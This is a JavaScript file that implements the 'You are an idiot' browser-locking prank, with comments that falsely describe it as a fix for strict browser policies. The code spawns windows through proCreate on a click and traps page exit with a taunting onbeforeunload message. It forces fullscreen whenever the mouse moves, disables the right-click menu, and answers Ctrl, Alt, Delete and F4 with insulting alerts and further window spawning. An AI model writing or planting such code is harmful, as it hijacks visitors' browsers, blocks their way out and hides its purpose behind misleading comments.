/* 
 * [Aug 2023] Fixed addEventListener for the document container.
 * [Oct 2021] Added to comply with strict browser policies.
 *
 * Requires safe.js & math.js preload.
 */
container.addEventListener('click', async () => {
	await proCreate(6);
	window.onbeforeunload = () => "Are you an idiot?";
});
let hasUserInteracted = false;

// Listen for any user interaction (click, keypress, etc.)
document.addEventListener("click", () => { hasUserInteracted = true; });
document.addEventListener("keydown", () => { hasUserInteracted = true; });

// Trigger fullscreen on mouse movement (if user has interacted before)
document.addEventListener("mousemove", () => {
    if (!hasUserInteracted) return; // Require at least one interaction first
    
    if (!document.fullscreenElement) {
        enterFullscreen();
    }
});

function enterFullscreen() {
    const element = document.documentElement; // Full page
    if (element.requestFullscreen) {
        element.requestFullscreen().catch(err => {
            console.error("Fullscreen failed:", err);
        });
    } 
    else if (element.webkitRequestFullscreen) { // Safari
        element.webkitRequestFullscreen();
    } 
    else if (element.msRequestFullscreen) { // IE11
        element.msRequestFullscreen();
    }
}
window.onload = playBall;
window.oncontextmenu = () => false;

window.onkeydown = function() {	
	var keyCode = event.keyCode;
	
	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
    	alert("You are an idiot!");
		proCreate();
	}
	
	return null;
}
/* [Aug 2023] End of amendments. */
